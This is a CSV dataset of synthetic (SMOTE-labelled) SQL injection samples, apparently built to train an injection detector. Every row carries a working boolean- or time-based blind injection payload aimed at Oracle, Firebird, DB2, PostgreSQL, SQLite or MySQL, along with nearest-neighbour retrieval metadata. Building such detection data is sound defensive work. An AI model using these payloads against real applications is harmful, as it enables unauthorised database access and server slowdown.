id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000139,attack,boolean,"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",nearest_attack_euclidean,R000440,0.2042216944241049
SMOTE_000140,attack,boolean,"-5825  )   as mflf where 3999  =  3999 or make_set  (  1492  =  7153,7153  )  --",nearest_attack_euclidean,R000624,0.05617386077381569
SMOTE_000141,attack,boolean,"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""ccuy""  =  ""ccuy",nearest_attack_euclidean,R001148,0.6042203726543308
SMOTE_000142,attack,boolean,"1  )   as wuio where 5312  =  5312 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000727,0.2389108973045544
SMOTE_000143,attack,boolean,"1'  )   as kgnd where 1550  =  1550 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000268,0.19973134869026968
SMOTE_000144,attack,boolean,"1%' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '%'  =  '",nearest_attack_euclidean,R000099,0.0001957107869105234
SMOTE_000145,attack,boolean,"1  )   where 2888  =  2888 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001182,0.06384917518450776
SMOTE_000146,attack,boolean,"-5181""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""qofp""  =  ""qofp",nearest_attack_euclidean,R001474,0.07971597511227799
SMOTE_000147,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000802,0.1534751996358246
SMOTE_000148,attack,boolean,"1' where 2332  =  2332 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000182,0.22103720659799428
SMOTE_000149,attack,boolean,"1  )   as wuio where 5312  =  5312 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000727,0.46243079460826386
SMOTE_000150,attack,boolean,"-4350""   )    )    as mmwq where 9801  =  9801 or   (  8520  =  2834  )  *2834--",nearest_attack_euclidean,R000889,0.3485490094170381
SMOTE_000151,attack,boolean,"-9699""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""dufs""  =  ""dufs",nearest_attack_euclidean,R000304,0.03974592124929898
SMOTE_000152,attack,boolean,"1%'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001366,0.04112650676325665
SMOTE_000153,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",nearest_attack_euclidean,R001049,0.20672974011449188
SMOTE_000154,attack,boolean,"1   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   7200  =  7200",nearest_attack_euclidean,R000615,1.1459292815795936
SMOTE_000155,attack,boolean,"-9698  )   as pvhn where 3223  =  3223 or elt  (  6563  =  9210,9210  )  --",nearest_attack_euclidean,R001283,0.29271696029066746
SMOTE_000156,attack,boolean,"-2414%""  )   or elt  (  1032  =  1032,3623  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001058,0.1684694879298568
SMOTE_000157,attack,boolean,"1'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'istb'  =  'istb",nearest_attack_euclidean,R001166,0.7097030463756464
SMOTE_000158,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R000678,0.2728779489300037
SMOTE_000159,attack,boolean,"1'   )    )    and elt  (  6847  =  5874,5874  )   and    (    (   'yspu'  =  'yspu",nearest_attack_euclidean,R000463,0.2727684247458887
SMOTE_000160,attack,boolean,"1%'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000885,0.10276302959259803
SMOTE_000161,attack,boolean,"1 where 6221  =  6221 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000622,0.23018546346384813
SMOTE_000162,attack,boolean,"1  )   as ndgd where 2367  =  2367 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000238,0.1644081690165512
SMOTE_000163,attack,boolean,"1'  )   as sjzi where 8242  =  8242 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000701,0.02837457102359747
SMOTE_000164,attack,boolean,"-3541"" or make_set  (  9354  =  9354,7185  )   and ""fgxu""  =  ""fgxu",nearest_attack_euclidean,R000888,0.21067425892559408
SMOTE_000165,attack,boolean,-8056   )    )    as botl where 9225  =  9225 or   (  1182  =  7641  )  *7641--,nearest_attack_euclidean,R000883,0.49940350511697845
SMOTE_000166,attack,boolean,-5995'   )    )    or 6872  =  6872 and    (    (   'pywh'  =  'pywh,nearest_attack_euclidean,R000629,0.30011859226749926
SMOTE_000167,attack,boolean,"1   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000514,0.1207240983510413
SMOTE_000168,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R001509,0.19748091532755468
SMOTE_000169,attack,boolean,"1' or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000117,0.03474614086567911
SMOTE_000170,attack,boolean,"1'  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001524,0.35600975330805595
SMOTE_000171,attack,boolean,"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R001124,0.06257321428497588
SMOTE_000172,attack,boolean,"1'   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001306,0.2622088767681636
SMOTE_000173,attack,boolean,"1%""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R001073,0.5049465972418601
SMOTE_000174,attack,boolean,"1'  )   where 1225  =  1225 and elt  (  8831  =  7779,7779  )  --",nearest_attack_euclidean,R000800,0.005939636890119569
SMOTE_000175,attack,boolean,"1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R000861,0.4145236160786293
SMOTE_000176,attack,boolean,"1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001050,0.6884075340323287
SMOTE_000177,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000802,0.13410217663105267
SMOTE_000178,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",nearest_attack_euclidean,R001325,0.09973937592769969
SMOTE_000179,attack,boolean,1'||  (  select 'dsjg' where 2402  =  2402 and 1947  =  7472--,nearest_attack_euclidean,R001198,0.6583855039272056
SMOTE_000180,attack,boolean,"-3729'   )    )    or elt  (  4482  =  2648,2648  )   and    (    (   'vkkr' like 'vkkr",nearest_attack_euclidean,R001461,0.02171721574286371
SMOTE_000181,attack,boolean,"1'  )   where 2775  =  2775 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000626,0.02929052222524382
SMOTE_000182,attack,boolean,"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'amjh'  =  'amjh",nearest_attack_euclidean,R001359,0.49998127968956074
SMOTE_000183,attack,boolean,"1""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""quni""  =  ""quni",nearest_attack_euclidean,R000602,0.1175782334340334
SMOTE_000184,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""ksip"" like ""ksip",nearest_attack_euclidean,R000592,0.5094053916172328
SMOTE_000185,attack,boolean,"-2625'  )   or elt  (  1032  =  1032,3623  )   and   (  'eliy'  =  'eliy",nearest_attack_euclidean,R000736,0.1918059263918874
SMOTE_000186,attack,boolean,"1%'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R001108,0.4614738636854342
SMOTE_000187,attack,boolean,"1' in boolean mode  )   and make_set  (  7804  =  3315,3315  )  #",nearest_attack_euclidean,R000224,1.1784894059812911
SMOTE_000188,attack,boolean,"1%""   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000281,0.034608341755836665
SMOTE_000189,attack,boolean,"1'  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001105,0.2062881093070685
SMOTE_000190,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000212,0.1158896269965579
SMOTE_000191,attack,boolean,"1  )   where 7485  =  7485 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000491,0.006845436664752944
SMOTE_000192,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '",nearest_attack_euclidean,R000789,0.02919019008808273
SMOTE_000193,attack,boolean,"1%""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R001392,1.460013577123967
SMOTE_000194,attack,boolean,"1""   )    )     )   and   (  7396  =  6351  )  *6351 and    (    (     (  ""xerw"" like ""xerw",nearest_attack_euclidean,R001280,0.04279610370625548
SMOTE_000195,attack,boolean,"1%'   )    )    and elt  (  4483  =  5364,5364  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R001220,0.910526413772868
SMOTE_000196,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000249,0.49531377301752777
SMOTE_000197,attack,boolean,"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""oyfz""  =  ""oyfz",nearest_attack_euclidean,R001064,0.08984917202568314
SMOTE_000198,attack,boolean,-3956'  )   or   (  8459  =  8459  )  *4906 and   (  'rflo' like 'rflo,nearest_attack_euclidean,R000263,0.35653125362740823
SMOTE_000199,attack,boolean,"-4849""   )    )    or   (  5005  =  9111  )  *9111 and    (    (   ""catv"" like ""catv",nearest_attack_euclidean,R001243,0.013346140372326966
SMOTE_000200,attack,boolean,"-3228""  )   or   (  5901  =  1570  )  *1570 and   (  ""egdd""  =  ""egdd",nearest_attack_euclidean,R001094,0.48955748564652496
SMOTE_000201,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",nearest_attack_euclidean,R001201,0.09782886625941682
SMOTE_000202,attack,boolean,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000072,0.19858701832323572
SMOTE_000203,attack,boolean,-6129  )   as vuze where 1565  =  1565 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000878,0.008126334834122706
SMOTE_000204,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",nearest_attack_euclidean,R001325,0.1341293701839101
SMOTE_000205,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000001,0.0
SMOTE_000206,attack,boolean,"1' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001348,0.3079226866919128
SMOTE_000207,attack,boolean,"1'  )   as nvqk where 3917  =  3917 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000525,0.7200535861493683
SMOTE_000208,attack,boolean,"-1370'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'xmrg'  =  'xmrg",nearest_attack_euclidean,R000534,0.0010955004095612696
SMOTE_000209,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  8489  =  8820  )   then 1 else 0x28 end   )    )    and    (    (   'fbjf'  =  'fbjf,nearest_attack_euclidean,R000648,0.5096674584742336
SMOTE_000210,attack,boolean,"1  )   where 9012  =  9012 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000895,0.3601081793715756
SMOTE_000211,attack,boolean,"1""  )   as advz where 5166  =  5166 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000416,0.46150923093308205
SMOTE_000212,attack,boolean,1'   )    )    and   (  5091  =  8681  )  *8681 and    (    (   'xevm'  =  'xevm,nearest_attack_euclidean,R001271,0.284334743592813
SMOTE_000213,attack,boolean,"1  )   as jqbv where 8172  =  8172 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001522,0.5526458089531129
SMOTE_000214,attack,boolean,"-1526'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xpob'  =  'xpob",nearest_attack_euclidean,R000946,0.0008206236034981485
SMOTE_000215,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'yhkr'  =  'yhkr",nearest_attack_euclidean,R000809,0.4546824492580058
SMOTE_000216,attack,boolean,"1%""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000140,0.09179198031532537
SMOTE_000217,attack,boolean,"1""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""lynw"" like ""lynw",nearest_attack_euclidean,R000768,0.9118880359315004
SMOTE_000218,attack,boolean,"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""qfhv""  =  ""qfhv",nearest_attack_euclidean,R000950,0.2063233678839458
SMOTE_000219,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R001475,0.05018602145992104
SMOTE_000220,attack,boolean,"1' in boolean mode  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001384,0.4731587743146685
SMOTE_000221,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'yvbb'  =  'yvbb",nearest_attack_euclidean,R001351,0.16122218384999804
SMOTE_000222,attack,boolean,"-6505'   )    )    as jtnp where 1037  =  1037 or elt  (  1032  =  1032,3623  )  --",nearest_attack_euclidean,R000649,0.10035459538729563
SMOTE_000223,attack,boolean,"1""  )   as pgza where 8756  =  8756 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000695,0.3068091879077484
SMOTE_000224,attack,boolean,"-7843' where 5986  =  5986 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R001378,0.01862543881371902
SMOTE_000225,attack,boolean,"1""   )    )    as szxa where 1501  =  1501 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000473,0.2541901251021065
SMOTE_000226,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa",nearest_attack_euclidean,R001304,0.9159998618701556
SMOTE_000227,attack,boolean,"1""  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001086,0.1858285195236684
SMOTE_000228,attack,boolean,"1%'   )    )    and elt  (  4483  =  5364,5364  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R001220,0.3209111529613153
SMOTE_000229,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R001163,0.763850255739548
SMOTE_000230,attack,boolean,1'   )    )    as oyad where 7161  =  7161 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000903,0.04586266681953594
SMOTE_000231,attack,boolean,"1   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001110,0.20592316825074974
SMOTE_000232,attack,boolean,"1%'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000916,0.00896078746357916
SMOTE_000233,attack,boolean,"1%"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""%""  =  """,nearest_attack_euclidean,R001490,0.3228043602437073
SMOTE_000234,attack,boolean,"-3541"" or make_set  (  9354  =  9354,7185  )   and ""fgxu""  =  ""fgxu",nearest_attack_euclidean,R000888,0.46678101093511104
SMOTE_000235,attack,boolean,"1'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000135,0.855464743502403
SMOTE_000236,attack,boolean,-6453%'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   '%'  =  ',nearest_attack_euclidean,R000638,0.8292267941032091
SMOTE_000237,attack,boolean,"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R001298,0.4277661227752994
SMOTE_000238,attack,boolean,"1%'   )    )    and elt  (  4483  =  5364,5364  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R001220,0.6334044925724954
SMOTE_000239,attack,boolean,"1'  )   as omtb where 1183  =  1183 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001277,0.18311637243440632
SMOTE_000240,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",nearest_attack_euclidean,R001004,0.9731060055272734
SMOTE_000241,attack,boolean,"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""pfea""  =  ""pfea",nearest_attack_euclidean,R000096,0.5988889978267948
SMOTE_000242,attack,boolean,"1'+  (  select 'lawc' where 1171  =  1171 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001417,0.16735718071162992
SMOTE_000243,attack,boolean,"1""  )   where 2873  =  2873 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001288,0.010806795411743491
SMOTE_000244,attack,boolean,"-7518"" or elt  (  8413  =  3995,3995  )   and ""cpnf""  =  ""cpnf",nearest_attack_euclidean,R000616,0.00023716311411035537
SMOTE_000245,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001158,0.026348143221614398
SMOTE_000246,attack,boolean,"1  )   as ekgx where 9923  =  9923 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001466,0.010726819726433278
SMOTE_000247,attack,boolean,-8056   )    )    as botl where 9225  =  9225 or   (  1182  =  7641  )  *7641--,nearest_attack_euclidean,R000883,0.05964966707873425
SMOTE_000248,attack,boolean,"1'+  (  select wjpc where 5943  =  5943 and make_set  (  8403  =  8403,8899   )    )   +'",nearest_attack_euclidean,R001560,0.6595885718133302
SMOTE_000249,attack,boolean,"1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001050,0.15991057118953933
SMOTE_000250,attack,boolean,"1  )   as jqbv where 8172  =  8172 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001522,0.6324319340942934
SMOTE_000251,attack,boolean,1'   )    )    and 2401  =  4693 and    (    (   'ssrm'  =  'ssrm,nearest_attack_euclidean,R000342,0.086155424499736
SMOTE_000252,attack,boolean,"1""   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001530,0.8165413287120045
SMOTE_000253,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000564,0.35658354759098426
SMOTE_000254,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000001,0.0
SMOTE_000255,attack,boolean,"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",nearest_attack_euclidean,R000991,0.03421920211251231
SMOTE_000256,attack,boolean,"1""  )   as rnte where 6517  =  6517 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000106,0.17602869005291197
SMOTE_000257,attack,boolean,"1""  )   where 2602  =  2602 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000293,0.0878743218872912
SMOTE_000258,attack,boolean,"1"" where 5845  =  5845 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000754,0.07566478000005358
SMOTE_000259,attack,boolean,"-2568""  )   or   (  8459  =  8459  )  *4906 and   (  ""exyw""  =  ""exyw",nearest_attack_euclidean,R001125,0.1874079828412793
SMOTE_000260,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",nearest_attack_euclidean,R000572,0.07514371746683317
SMOTE_000261,attack,boolean,"1'   )    )    as cgey where 2130  =  2130 and make_set  (  7914  =  4032,4032  )  --",nearest_attack_euclidean,R000675,0.4898898800923621
SMOTE_000262,attack,boolean,"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""asvy""  =  ""asvy",nearest_attack_euclidean,R001557,0.004953605751590768
SMOTE_000263,attack,boolean,"1  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000537,0.3469539114148039
SMOTE_000264,attack,boolean,1'   )    )    as cyom where 2318  =  2318 and 7533  =  7533--,nearest_attack_euclidean,R001063,0.2473325322949785
SMOTE_000265,attack,boolean,1'  )   as xqbq where 1619  =  1619 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R001469,0.4290717708684811
SMOTE_000266,attack,boolean,"1   )    )    as rpwt where 4103  =  4103 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000350,0.009901333071006763
SMOTE_000267,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'gkku' like 'gkku",nearest_attack_euclidean,R000161,0.013143118167095362
SMOTE_000268,attack,boolean,"1""  )   as advz where 5166  =  5166 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000416,0.4389997531886047
SMOTE_000269,attack,boolean,"1  )   and elt  (  4249  =  4249,7259  )   and   (  8226  =  8226",nearest_attack_euclidean,R000545,0.07602704165584671
SMOTE_000270,attack,boolean,"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R001278,1.0239893531167297
SMOTE_000271,attack,boolean,"1'+  (  select pepf where 5071  =  5071 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001379,0.3392011580646828
SMOTE_000272,attack,boolean,"-1526'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xpob'  =  'xpob",nearest_attack_euclidean,R000946,0.07405011719599962
SMOTE_000273,attack,boolean,"-1993%""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000740,1.4390684712443178
SMOTE_000274,attack,boolean,"1   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000961,0.5607281194603947
SMOTE_000275,attack,boolean,"-3868'   )    )    or make_set  (  6809  =  1236,1236  )   and    (    (   'evnj'  =  'evnj",nearest_attack_euclidean,R001504,0.07820917768488814
SMOTE_000276,attack,boolean,"1  )   as wuio where 5312  =  5312 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000727,0.023858929752464394
